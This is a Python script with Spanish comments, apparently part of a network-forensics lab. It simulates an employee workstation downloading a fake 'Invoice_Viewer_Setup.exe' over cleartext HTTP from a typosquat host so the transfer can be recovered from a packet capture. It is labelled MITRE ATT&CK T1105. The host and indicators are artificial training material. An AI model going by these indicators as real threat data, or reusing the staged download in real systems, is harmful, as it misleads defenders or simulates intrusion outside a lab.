#!/usr/bin/env python3
"""
Estacion del empleado que se descarga el "instalador" malicioso por HTTP.

Simula a un usuario que visita un sitio de descargas typosquat y se baja un
ejecutable por HTTP EN CLARO. La descarga completa (el binario) queda capturada
y es reconstruible del PCAP. MITRE ATT&CK T1105 (Ingress Tool Transfer).
"""
import os
import socket
import time
import urllib.request

WEB_HOST = os.environ.get("WEB_HOST", "webserver")
WEB_PORT = int(os.environ.get("WEB_PORT", "80"))
START_DELAY = int(os.environ.get("START_DELAY", "6"))
# Host header typosquat que vera el analista en el PCAP (IOC).
FAKE_HOST = os.environ.get("FAKE_HOST", "cdn.northw1nd-files.com")
MALWARE_PATH = "/downloads/Invoice_Viewer_Setup.exe"
BASE = f"http://{WEB_HOST}:{WEB_PORT}"


def log(msg):
    print(msg, flush=True)


def wait_for(retries=40):
    for _ in range(retries):
        try:
            with socket.create_connection((WEB_HOST, WEB_PORT), timeout=2):
                return True
        except OSError:
            time.sleep(1)
    raise SystemExit(f"[workstation] web {WEB_HOST}:{WEB_PORT} no responde")


def get(path):
    req = urllib.request.Request(BASE + path, headers={"Host": FAKE_HOST,
                                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0)"})
    with urllib.request.urlopen(req, timeout=8) as resp:
        return resp.read()


def main():
    time.sleep(START_DELAY)
    wait_for()
    log(f"[workstation] navegando el portal de descargas (HTTP en claro, Host={FAKE_HOST})")
    get("/")
    time.sleep(0.4)
    log(f"[workstation] descargando {MALWARE_PATH} ...")
    data = get(MALWARE_PATH)
    log(f"[workstation] descargado el binario ({len(data)} bytes) — MZ={data[:2]!r}")
    log("[workstation] flujo completado. Fin.")


if __name__ == "__main__":
    main()
